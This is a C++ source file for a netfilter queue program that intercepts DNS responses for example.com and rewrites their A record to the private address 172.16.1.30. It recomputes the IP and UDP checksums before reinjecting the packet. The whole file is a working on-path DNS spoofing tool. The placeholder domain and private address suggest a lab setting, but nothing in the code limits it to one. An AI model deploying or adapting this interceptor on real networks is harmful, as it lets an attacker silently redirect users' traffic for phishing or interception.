#include <arpa/inet.h>
#include <linux/netfilter.h>
#include <libnetfilter_queue/libnetfilter_queue.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/socket.h>
#include <unistd.h>

#include <cstdint>
#include <cstdio>
#include <cstring>
#include <iostream>
#include <string>
#include <vector>

static const char* REPLACEMENT_IP = "172.16.1.30";

static uint16_t checksum(const unsigned char* data, size_t len) {
    uint32_t sum = 0;
    while (len >= 2) {
        sum += (static_cast<uint16_t>(data[0]) << 8) | data[1];
        data += 2;
        len -= 2;
    }
    if (len) sum += static_cast<uint16_t>(data[0]) << 8;
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    return static_cast<uint16_t>(~sum);
}

static uint16_t read_u16(const unsigned char* p) {
    return (static_cast<uint16_t>(p[0]) << 8) | p[1];
}

static void write_u16(unsigned char* p, uint16_t value) {
    p[0] = static_cast<unsigned char>(value >> 8);
    p[1] = static_cast<unsigned char>(value & 0xff);
}

// Skip a DNS name, including compressed names. 'pos' advances past the name.
static bool skip_dns_name(const unsigned char* dns, size_t len, size_t& pos) {
    while (pos < len) {
        unsigned char n = dns[pos];
        if (n == 0) {
            ++pos;
            return true;
        }
        if ((n & 0xc0) == 0xc0) {
            if (pos + 1 >= len) return false;
            pos += 2;
            return true;
        }
        if (n & 0xc0) return false;
        ++pos;
        if (pos + n > len) return false;
        pos += n;
    }
    return false;
}

static bool is_target_response(const unsigned char* dns, size_t len) {
    if (!dns || len < 12) return false;

    uint16_t flags = read_u16(dns + 2);
    uint16_t qdcount = read_u16(dns + 4);
    uint16_t ancount = read_u16(dns + 6);
    if (!(flags & 0x8000) || qdcount != 1 || ancount == 0) return false;

    size_t pos = 12;
    std::string name;
    while (pos < len) {
        unsigned char label_len = dns[pos++];
        if (label_len == 0) break;
        if ((label_len & 0xc0) != 0 || pos + label_len > len) return false;
        if (!name.empty()) name += '.';
        for (size_t i = 0; i < label_len; ++i) {
            char c = static_cast<char>(dns[pos + i]);
            if (c >= 'A' && c <= 'Z') c = static_cast<char>(c - 'A' + 'a');
            name += c;
        }
        pos += label_len;
    }
    if (pos + 4 > len) return false;
    uint16_t qtype = read_u16(dns + pos);
    uint16_t qclass = read_u16(dns + pos + 2);
    if (name != "example.com" || qtype != 1 || qclass != 1) return false;

    // Confirm that the answer section contains at least one IN/A record.
    pos += 4;
    for (uint16_t i = 0; i < ancount; ++i) {
        if (!skip_dns_name(dns, len, pos) || pos + 10 > len) return false;
        uint16_t type = read_u16(dns + pos);
        uint16_t klass = read_u16(dns + pos + 2);
        uint16_t rdlen = read_u16(dns + pos + 8);
        pos += 10;
        if (pos + rdlen > len) return false;
        if (type == 1 && klass == 1 && rdlen == 4) return true;
        pos += rdlen;
    }
    return false;
}

static bool rewrite_dns_answer(unsigned char* dns, size_t len) {
    if (!is_target_response(dns, len)) return false;

    size_t pos = 12;
    if (!skip_dns_name(dns, len, pos) || pos + 4 > len) return false;
    pos += 4; // QTYPE + QCLASS

    unsigned char replacement[4];
    if (inet_pton(AF_INET, REPLACEMENT_IP, replacement) != 1) return false;

    uint16_t ancount = read_u16(dns + 6);
    for (uint16_t i = 0; i < ancount; ++i) {
        if (!skip_dns_name(dns, len, pos) || pos + 10 > len) return false;
        uint16_t type = read_u16(dns + pos);
        uint16_t klass = read_u16(dns + pos + 2);
        uint16_t rdlen = read_u16(dns + pos + 8);
        pos += 10;
        if (pos + rdlen > len) return false;
        if (type == 1 && klass == 1 && rdlen == 4) {
            std::memcpy(dns + pos, replacement, 4);
            return true;
        }
        pos += rdlen;
    }
    return false;
}

static bool recalculate_checksums(std::vector<unsigned char>& packet,
                                  size_t ip_len, size_t udp_len) {
    if (packet.size() < ip_len + sizeof(udphdr) ||
        udp_len < sizeof(udphdr) || ip_len + udp_len > packet.size()) return false;

    // IPv4 header checksum.
    packet[10] = packet[11] = 0;
    write_u16(packet.data() + 10, checksum(packet.data(), ip_len));

    // UDP checksum uses the IPv4 pseudo-header.
    size_t udp_off = ip_len;
    packet[udp_off + 6] = packet[udp_off + 7] = 0;
    std::vector<unsigned char> pseudo(12 + udp_len, 0);
    std::memcpy(pseudo.data(), packet.data() + 12, 8); // source + destination IP
    pseudo[9] = IPPROTO_UDP;
    write_u16(pseudo.data() + 10, static_cast<uint16_t>(udp_len));
    std::memcpy(pseudo.data() + 12, packet.data() + udp_off, udp_len);
    uint16_t udp_sum = checksum(pseudo.data(), pseudo.size());
    if (udp_sum == 0) udp_sum = 0xffff;
    write_u16(packet.data() + udp_off + 6, udp_sum);
    return true;
}

static int packet_callback(nfq_q_handle* queue, nfgenmsg*, nfq_data* nfq_packet, void*) {
    nfqnl_msg_packet_hdr* header = nfq_get_msg_packet_hdr(nfq_packet);
    if (!header) return 0;
    uint32_t packet_id = ntohl(header->packet_id);

    unsigned char* payload = nullptr;
    int length = nfq_get_payload(nfq_packet, &payload);
    if (length <= 0 || !payload || static_cast<size_t>(length) < sizeof(iphdr))
        return nfq_set_verdict(queue, packet_id, NF_ACCEPT, 0, nullptr);

    std::vector<unsigned char> packet(payload, payload + length);
    auto* ip = reinterpret_cast<iphdr*>(packet.data());
    if (ip->version != 4 || ip->ihl < 5 || ip->protocol != IPPROTO_UDP)
        return nfq_set_verdict(queue, packet_id, NF_ACCEPT, 0, nullptr);

    size_t ip_len = static_cast<size_t>(ip->ihl) * 4;
    if (packet.size() < ip_len + sizeof(udphdr))
        return nfq_set_verdict(queue, packet_id, NF_ACCEPT, 0, nullptr);

    auto* udp = reinterpret_cast<udphdr*>(packet.data() + ip_len);
    size_t udp_len = ntohs(udp->len);
    if (ntohs(udp->source) != 53 || udp_len < sizeof(udphdr) + 12 ||
        udp_len > packet.size() - ip_len)
        return nfq_set_verdict(queue, packet_id, NF_ACCEPT, 0, nullptr);

    unsigned char* dns = packet.data() + ip_len + sizeof(udphdr);
    size_t dns_len = udp_len - sizeof(udphdr);
    if (!rewrite_dns_answer(dns, dns_len))
        return nfq_set_verdict(queue, packet_id, NF_ACCEPT, 0, nullptr);

    if (!recalculate_checksums(packet, ip_len, udp_len))
        return nfq_set_verdict(queue, packet_id, NF_ACCEPT, 0, nullptr);

    char src[INET_ADDRSTRLEN] = {}, dst[INET_ADDRSTRLEN] = {};
    inet_ntop(AF_INET, packet.data() + 12, src, sizeof(src));
    inet_ntop(AF_INET, packet.data() + 16, dst, sizeof(dst));
    std::cout << "[DNS match] example.com A response " << src << " -> " << dst
              << "; answer changed to " << REPLACEMENT_IP << std::endl;

    // Replace only the matched packet. All other packets are accepted unchanged.
    return nfq_set_verdict(queue, packet_id, NF_ACCEPT,
                           static_cast<uint32_t>(packet.size()), packet.data());
}

int main() {
    nfq_handle* handle = nfq_open();
    if (!handle) {
        std::cerr << "Could not open NFQUEUE\n";
        return 1;
    }

    nfq_unbind_pf(handle, AF_INET);
    if (nfq_bind_pf(handle, AF_INET) < 0) {
        std::cerr << "Could not bind IPv4\n";
        nfq_close(handle);
        return 1;
    }

    nfq_q_handle* queue = nfq_create_queue(handle, 0, &packet_callback, nullptr);
    if (!queue || nfq_set_mode(queue, NFQNL_COPY_PACKET, 0xffff) < 0) {
        std::cerr << "Could not configure NFQUEUE 0\n";
        if (queue) nfq_destroy_queue(queue);
        nfq_close(handle);
        return 1;
    }

    std::cout << "[interceptor] NFQUEUE 0 ready; target answer="
              << REPLACEMENT_IP << std::endl;
    int fd = nfq_fd(handle);
    unsigned char buffer[65536];
    while (true) {
        int received = recv(fd, buffer, sizeof(buffer), 0);
        if (received < 0) {
            std::perror("NFQUEUE recv");
            break;
        }
        if (nfq_handle_packet(handle, reinterpret_cast<char*>(buffer), received) < 0)
            std::cerr << "Failed to process queue message\n";
    }

    nfq_destroy_queue(queue);
    nfq_close(handle);
    return 0;
}
